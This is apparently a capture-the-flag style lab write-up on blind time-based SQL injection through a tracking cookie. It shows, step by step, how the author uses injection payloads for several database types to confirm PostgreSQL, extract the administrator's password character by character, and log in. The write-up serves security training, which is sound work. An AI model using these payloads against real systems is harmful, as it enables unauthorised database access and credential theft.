# Lab: Blind SQL injection with time delays and information retrieval

## Description

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Hint

Check out the SQLi cheat sheet

![image](https://user-images.githubusercontent.com/83407557/172084631-72e84084-1d39-4af7-84fa-b1479377b76b.png)


## Step 1 Finding injection point/discovering database type

As a first step, I am going to capture the request being sent to the main page of the webapp via burp:

![image](https://user-images.githubusercontent.com/83407557/208308215-cdf6af8c-a7df-4e82-ad8e-17789f1ee3e7.png)

I will then send that request to the burp intruder and select a payload at the end the server's tracking cookie:

![image](https://user-images.githubusercontent.com/83407557/208308320-9ca5d8fa-a5c0-47e1-9e43-268a2e265d4d.png)

To decrease the chance of getting a false positive, I change my default resource pool to only send a single request at a time:

![image](https://user-images.githubusercontent.com/83407557/208308441-061be3d1-b685-496e-a021-2887a7c5b624.png)


Since I am not sure what the database type is, I can check for a timing delay using the conditional time delay payloads from portswigger(note that each payload is repeated as a stacked query using a `;`)

```sql
'SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
'IF (1=1) WAITFOR DELAY '0:0:10'--
'SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'SELECT IF(1=1,sleep(10),'a')--
';SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual--
';IF (1=1) WAITFOR DELAY '0:0:10'--
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
';SELECT IF(1=1,sleep(10),'a')--
```
With these payloads I also add a rule to urlencode all characters:


![image](https://user-images.githubusercontent.com/83407557/208309376-8ee9fc9a-19b0-49b6-a826-9829e389b527.png)



This response takes much longer than the others, telling me there is a blind conditional time-based vulnerability and that it is a PostgreSQL database

![image](https://user-images.githubusercontent.com/83407557/208309451-b4486882-052a-4dbd-a614-bff1b2e25143.png)

I can tell which payload this is by sending the result to the decoder:

![image](https://user-images.githubusercontent.com/83407557/208309506-1cd4d6b8-7826-4349-bc4d-72aec4b188dd.png)

In order to verify that there is a boolean base response, I can send the payload that took the longest and change it to a false statement

True:
`';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`

False
`';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--`

![image](https://user-images.githubusercontent.com/83407557/208309626-fb9248cd-390b-43de-b27f-a3f20fc50764.png)

The attack shows me that I am able to ask this DB boolean (true vs. false) based queries 

![image](https://user-images.githubusercontent.com/83407557/208309654-8b7fd22f-2e50-4338-9b4a-709f0ccfc292.png)



# Step 2 Verify there is an "Administrator" user in a "users" table

Since I can query different things expecting either a true/false response base on timing I can use the following to see if there is a user named Administrator in the users table

TRUE:
```sql
'%3BSELECT+CASE+WHEN+(username='Administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

I can aslo send some payload I know are going to be false (like if my name is in the users table)

FALSE:
```sql
'%3BSELECT+CASE+WHEN+(username='hermh4cks')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

This time, instead of intruder, I just use the repeater to make it faster:
![image](https://user-images.githubusercontent.com/83407557/208310389-7931619d-de01-4dc6-b115-355615d05d4c.png)


and confirm that there is a user named administrator in the users table

# Step 3 determin the length of the administrator user's password

I can use a greater than against the length in repeater, and then send that request to the intruder:
![image](https://user-images.githubusercontent.com/83407557/208310542-97af0e44-b2f8-4153-90bd-1a770d05cbac.png)

For the payload possition I put the number representing the length of the password
![image](https://user-images.githubusercontent.com/83407557/208310593-2fd56a75-b995-48ad-821b-0c2eb43de707.png)

for the payload I will use numers 2-30 (after the number becomes greater than the password I should start getting the server to sleep for 10)
![image](https://user-images.githubusercontent.com/83407557/208310666-452e4a67-1280-4a39-b6de-1dc5b6851a92.png)

Seeing that the last request before I got a delay was 20, lets me know that the password is 20 characters long

![image](https://user-images.githubusercontent.com/83407557/208311016-de448f01-ad1e-4d05-8bc1-883deaf62351.png)

# Step 4 finding the 20 character long password

To do this I will need to test each character in each possition of the password's 20 character long string:
The initial payload would just test for an 'a' in possition substring possition 1:
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
With this payload possition:

![image](https://user-images.githubusercontent.com/83407557/208311412-35df2f2a-aa51-40d6-b220-c89561b1c596.png)

and a payload of a-z A-Z and 0-9

I will be able to loop through all 20 character and test all letters and numbers for each one:


doing this I find that the first character is a 7:
![image](https://user-images.githubusercontent.com/83407557/208311535-0e6fd260-3351-4f82-ae9f-70d79a13fad1.png)

**Password=** 7

I then go back and change the substring pos to target the second character:
![image](https://user-images.githubusercontent.com/83407557/208311569-396bf696-ac13-4cfd-b2b0-75e540909a45.png)

![image](https://user-images.githubusercontent.com/83407557/208311632-8db7eef0-8ac5-4e6e-92d6-f725d7b345e0.png)

**Password=** 7r

I continue to do this for every character:

![image](https://user-images.githubusercontent.com/83407557/208311705-d3f58610-b5bb-4581-bf58-03ac86891bf9.png)

**Password=** 7r0

![image](https://user-images.githubusercontent.com/83407557/208311768-d9560c71-fc90-4773-abbb-c9afe835a524.png)

**Password=** 7r00

![image](https://user-images.githubusercontent.com/83407557/208311804-df5cfec6-9d79-4e40-892a-cdf8e124da03.png)

**Password=** 7r00d

![image](https://user-images.githubusercontent.com/83407557/208311877-45dc7563-c30b-4683-ace6-aef0c8b0f3d2.png)

**Password=** 7r00dn

![image](https://user-images.githubusercontent.com/83407557/208311936-ce29ebaa-413f-4484-b215-33d743a5f107.png)


**Password=** 7r00dnu

![image](https://user-images.githubusercontent.com/83407557/208311988-60bd859f-e35e-4962-8511-95b60cc1aa4b.png)


**Password=** 7r00dnu9

![image](https://user-images.githubusercontent.com/83407557/208312019-7c507562-90ac-4e26-9411-8c69b4439d36.png)


**Password=** 7r00dnu9a

![image](https://user-images.githubusercontent.com/83407557/208312045-af6cd0bc-c2b0-44ea-ba87-24f71da4446e.png)


**Password=** 7r00dnu9ad

![image](https://user-images.githubusercontent.com/83407557/208312082-17229ac4-b6f4-4c5a-9b28-fd66aaaa74d9.png)


**Password=** 7r00dnu9adu


![image](https://user-images.githubusercontent.com/83407557/208312122-f33ece9b-7bc0-4597-95f0-fe1f6db5de9c.png)


**Password=** 7r00dnu9aduz

![image](https://user-images.githubusercontent.com/83407557/208312147-3c9ed030-f9bc-4390-9154-42113667ecc8.png)


**Password=** 7r00dnu9aduzn

![image](https://user-images.githubusercontent.com/83407557/208312167-2ac6da82-4cf6-4d00-85a3-197d6a261002.png)


**Password=** 7r00dnu9aduzne

![image](https://user-images.githubusercontent.com/83407557/208312204-88847e5c-1a72-4103-9800-efa619228aad.png)


**Password=** 7r00dnu9aduznef

![image](https://user-images.githubusercontent.com/83407557/208312245-cdc39298-4b40-43d4-aef3-a26d17813cfc.png)


**Password=** 7r00dnu9aduznefw

![image](https://user-images.githubusercontent.com/83407557/208312294-a986b451-fb1d-40d5-80d3-255feedba947.png)


**Password=** 7r00dnu9aduznefwu

![image](https://user-images.githubusercontent.com/83407557/208312329-b636659f-7fa1-4377-a78d-e3588362ade1.png)

**Password=** 7r00dnu9aduznefwui

![image](https://user-images.githubusercontent.com/83407557/208312363-dc620a72-24bc-4236-bbdb-b16e4530c71a.png)


**Password=** 7r00dnu9aduznefwuib

![image](https://user-images.githubusercontent.com/83407557/208312500-8c8287dd-79ba-4061-a6de-ec668c6e2a91.png)


**Final Password=** 7r00dnu9aduznefwuib6

# Step 5 using found username and password to login and solve the lab:

![image](https://user-images.githubusercontent.com/83407557/208312552-4606d5cd-43ac-4573-a1d3-3597a4626603.png)

![image](https://user-images.githubusercontent.com/83407557/208312590-c4b76f00-435f-4576-8026-8c7d82416b1d.png)

